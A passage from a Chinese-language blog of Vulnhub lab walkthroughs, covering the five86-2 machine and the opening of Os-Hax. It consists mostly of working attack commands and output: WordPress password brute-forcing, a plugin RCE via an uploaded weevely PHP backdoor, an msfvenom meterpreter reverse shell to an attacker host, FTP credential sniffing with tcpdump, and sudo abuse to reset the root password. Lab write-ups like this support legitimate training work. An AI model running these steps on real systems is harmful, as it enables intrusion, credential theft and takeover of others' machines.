<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line"></span><br><span class="line">barney</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">peter</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure>
<p>尝试进行账户爆破</p>
<p><code>wpscan --url http://192.168.31.51/ -U user -P /usr/share/wordlists/rockyou.txt</code></p>
<p>得到两个账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">barney spooky1</span><br><span class="line">stephen apollo1</span><br></pre></td></tr></table></figure>
<p>在<code>/wp-login.php</code>登入</p>
<p>登入之后在<code>Plugins</code>面板看到存在插件</p>
<p><code>Insert or Embed Articulate Content into WordPress Trial</code></p>
<p>搜索相关信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Insert or Embed Articulate Content into WordPress</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;46981.txt</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
<p>再查看漏洞的具体利用步骤<br />
<code>cat /usr/share/exploitdb/exploits/php/webapps/46981.txt</code></p>
<ol>
<li>使用weevely构造php后门并创建一个文件index.html，压缩成zip文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass &gt; shell.php</span><br><span class="line">echo &gt; index.html</span><br><span class="line">zip poc.zip index.html shell.php</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>登入wordpress(已登入)</li>
<li>依次点击<code>Posts -&gt; Add New -&gt; Add block -&gt; e-Learning -&gt; UPLOAD -&gt; CHOOES YOUR ZIP FILE -&gt; poc.zip -&gt; UPLOAD! -&gt; Insert As: iFrame -&gt; INSERT</code></li>
<li>此时会显示出index.html的路径，复制之后将index.html改为shell.php即为后门路径</li>
<li>连接后门<br />
<code>weevely http://five86-2/wp-content/uploads/articulate_uploads/poc/shell.php pass</code></li>
</ol>
<h2 id="权限提升-10"><a class="markdownIt-Anchor" href="#权限提升-10"></a> 权限提升</h2>
<p>查看系统信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux five86-2 5.3.0-26-generic #28-Ubuntu SMP Wed Dec 18 05:37:46 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
<p>构造meterpreter后门程序</p>
<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9990 -f elf &gt; msf.elf</code></p>
<p>在MSF中开启监听</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9990</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>在weevely中上传后门程序并启动(需要填写绝对路径)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;msf.elf</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">chmod +x msf.elf</span><br><span class="line">.&#x2F;msf.elf</span><br></pre></td></tr></table></figure>
<p>在meterpreter的shell中获取tty</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>查看文件<code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">barney:x:1001:1001:Barney Sumner:&#x2F;home&#x2F;barney:&#x2F;bin&#x2F;bash</span><br><span class="line">stephen:x:1002:1002:Stephen Morris:&#x2F;home&#x2F;stephen:&#x2F;bin&#x2F;bash</span><br><span class="line">peter:x:1003:1003:Peter Hook:&#x2F;home&#x2F;peter:&#x2F;bin&#x2F;bash</span><br><span class="line">gillian:x:1004:1004:Gillian Gilbert:&#x2F;home&#x2F;gillian:&#x2F;bin&#x2F;bash</span><br><span class="line">richard:x:1005:1005:Richard Starkey:&#x2F;home&#x2F;richard:&#x2F;bin&#x2F;bash</span><br><span class="line">paul:x:1006:1006:Paul McCartney:&#x2F;home&#x2F;paul:&#x2F;bin&#x2F;bash</span><br><span class="line">john:x:1007:1007:John Lennon:&#x2F;home&#x2F;john:&#x2F;bin&#x2F;bash</span><br><span class="line">george:x:1008:1008:George Harrison:&#x2F;home&#x2F;george:&#x2F;bin&#x2F;bash</span><br><span class="line">dnsmasq:x:114:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure>
<p>存在用户<code>barney</code>和<code>stephen</code><br />
尝试套用Wordpress账户的密码<br />
可以登入账户stephen</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br><span class="line">apollo1</span><br></pre></td></tr></table></figure>
<p>查看当前用户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid&#x3D;1002(stephen) gid&#x3D;1002(stephen) groups&#x3D;1002(stephen),1009(pcap)</span><br></pre></td></tr></table></figure>
<p>查看特权命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getcap -r &#x2F; 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mtr-packet &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper &#x3D; cap_net_bind_service,cap_net_admin+ep</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;tcpdump &#x3D; cap_net_admin,cap_net_raw+eip</span><br></pre></td></tr></table></figure>
<p>发现存在tcpdump程序，可以用于监听流量</p>
<p>查看程序tcpdump所有者与所有组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;usr&#x2F;sbin&#x2F;tcpdump</span><br><span class="line">-rwxr-x--- 1 root pcap 1044232 Oct 11 18:48 &#x2F;usr&#x2F;sbin&#x2F;tcpdump</span><br></pre></td></tr></table></figure>
<p>而用户stephen也属于pcap组，可以使用tcpdump程序</p>
<p>查看系统关于ftp的进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep ftp</span><br><span class="line"></span><br><span class="line">systemd+  1251  0.0  0.3 119976  1876 pts&#x2F;0    Ss+  10:21   0:01 proftpd: (accepting connections)</span><br><span class="line">paul      2329  0.0  0.1   2600   788 ?        Ss   12:00   0:00 &#x2F;bin&#x2F;sh -c &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">paul      2330  0.0  0.1   2600   788 ?        S    12:00   0:00 &#x2F;bin&#x2F;sh &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh</span><br><span class="line">paul      2331  0.0  0.4   3224  2124 ?        S    12:00   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2332  0.0  1.2 133072  6124 pts&#x2F;0    S+   12:00   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2335  0.0  0.1   6496   856 pts&#x2F;0    S+   12:01   0:00 grep ftp</span><br></pre></td></tr></table></figure>
<p>用户paul正在执行脚本<code>ftp_upload.sh</code>和命令<code>ftp -n 172.18.0.10</code><br />
而FTP是明文传输，可以通过监听流量来获取一些信息</p>
<p>查看网络接口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -D</span><br><span class="line"></span><br><span class="line">1.br-eca3858d86bf [Up, Running]</span><br><span class="line">2.eth0 [Up, Running]</span><br><span class="line">3.vethf7d5e2c [Up, Running]</span><br><span class="line">4.lo [Up, Running, Loopback]</span><br><span class="line">5.any (Pseudo-device that captures on all interfaces) [Up, Running]</span><br><span class="line">6.docker0 [Up]</span><br><span class="line">7.nflog (Linux netfilter log (NFLOG) interface) [none]</span><br><span class="line">8.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]</span><br></pre></td></tr></table></figure>
<p>监听流量一分钟</p>
<p><code>timeout 60 tcpdump -i vethf7d5e2c -w /tmp/cap.pcap</code></p>
<p>查看流量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -r &#x2F;tmp&#x2F;cap.pcap</span><br><span class="line"></span><br><span class="line">12:12:05.337100 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 1:58, ack 1, win 1019, options [nop,nop,TS val 1753001473 ecr 956298429], length 57: FTP: 220 ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]</span><br><span class="line">12:12:05.337126 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 0</span><br><span class="line">12:12:05.337305 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 11: FTP: USER paul</span><br><span class="line">12:12:05.337311 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [.], ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 0</span><br><span class="line">12:12:05.337522 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 58:90, ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 32: FTP: 331 Password required for paul</span><br><span class="line">12:12:05.337610 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 0</span><br><span class="line">12:12:05.337627 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 12:33, ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 21: FTP: PASS esomepasswford</span><br></pre></td></tr></table></figure>
<p>得到账户<code>paul:esomepasswford</code></p>
<p>切换至账户paul</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su paul</span><br><span class="line">esomepasswford</span><br></pre></td></tr></table></figure>
<p>查看sudo权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;service</span><br></pre></td></tr></table></figure>
<p>可以以用户peter的权限去执行<code>/usr/sbin/service</code><br />
即可以通过该命令切换至账户peter<br />
<code>sudo -u peter /usr/sbin/service ../../bin/bash</code></p>
<p>查看该用户sudo权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>即可用passwd命令修改root账户的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root passwd root</span><br><span class="line">hackforfun</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure>
<p>切换至root账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>HTTP爆破</p>
</blockquote>
<p>我在自己尝试了弱口令字典失败后再想了一下别的方向，无果后去看其他大神的WP，发现需要用rockyou.txt，本地测试跑完这个字典需要数十个小时<br />
这一步的话可能换一个简单点的口令或者放一个LFI漏洞去读passwd然后爆破hash就更恰当点</p>
<blockquote>
<p>FTP流量劫持</p>
</blockquote>
<p>做到流量劫持这一步整个人完全懵了，没想到是怎么看出来后台有FTP传输任务，顺着其他大神的思路打通之后浏览了下那个脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat ftp_upload.sh</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">HOST&#x3D;&#39;172.18.0.10&#39;</span><br><span class="line">USER&#x3D;&#39;paul&#39;</span><br><span class="line">PASSWD&#x3D;&#39;esomepasswford&#39;</span><br><span class="line">FILE&#x3D;&#39;file.txt&#39;</span><br><span class="line"></span><br><span class="line">ftp -n $HOST &lt;&lt;END_SCRIPT</span><br><span class="line">quote USER $USER</span><br><span class="line">quote PASS $PASSWD</span><br><span class="line">binary</span><br><span class="line">put $FILE</span><br><span class="line">quit</span><br><span class="line">END_SCRIPT</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
<p>大意应该是持续用ftp命令上传文件file.txt<br />
所以在用命令<code>ps -aux | grep ftp</code>是会看到paul在执行<code>ftp -n 172.18.0.10</code></p>
<blockquote>
<p>为什么是网络接口vethf7d5e2c而不是br-eca3858d86bf</p>
</blockquote>
<p>本地操作时接口br-eca3858d86bf的ip是172.18.0.1，而vethf7d5e2c没有ipv4地址<br />
实际操作时只能尝试监听所有可能的网卡</p>
<blockquote>
<p>capabilities 关于linux特权</p>
</blockquote>
<p>在系统的角度检测非root用户进行特权操作时，该命令所需的权限与被赋予的权限是否相符<br />
<code>getcap -r / 2&gt;/dev/null</code></p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/11417781.html">capabilities</a><br />
<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities manual page</a><br />
<a target="_blank" rel="noopener" href="http://www.liuwx.cn/Vulnhub-five86-2.html#tcpdump%E6%8B%A6%E6%88%AA%E7%BD%91%E5%8D%A1%E6%B5%81%E9%87%8F%E8%8E%B7%E5%8F%96FTP%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81">WP</a></p>
</blockquote>
<hr />
<h1 id="os-hax"><a class="markdownIt-Anchor" href="#os-hax"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hax,389/">Os-Hax</a></h1>
<p><code>2020/03/17 20:53:03</code></p>
<h2 id="端口扫描-11"><a class="markdownIt-Anchor" href="#端口扫描-11"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.36</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.36</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)</span><br><span class="line">|   256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c (ECDSA)</span><br><span class="line">|_  256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Hacker_James</span><br><span class="line">MAC Address: 08:00:27:0D:02:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.070 days (since Tue Mar 17 06:51:52 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-11"><a class="markdownIt-Anchor" href="#web路径枚举-11"></a> Web路径枚举</h2>
<p>尝试爆破80端口下的Web路径</p>
<p><code>dirb http://192.168.31.36/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.36&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;css&#x2F;                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;html&#x2F;                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;img&#x2F;                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.36&#x2F;index.html (CODE:200|SIZE:3135)                           </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;js&#x2F;                                          </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.36&#x2F;server-status (CODE:403|SIZE:278)                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-11"><a class="markdownIt-Anchor" href="#漏洞利用-11"></a> 漏洞利用</h2>
<p>枚举wordpress账户的用户名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F; -e u</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] web</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>尝试爆破弱口令，失败</p>
<p>浏览静态文件时发现图片文件<code>/img/flaghost.png</code><br />
图片本身并没有有效信息<br />
下载至本地，用LSB隐写检测程序<code>zsteg</code>检测图片</p>
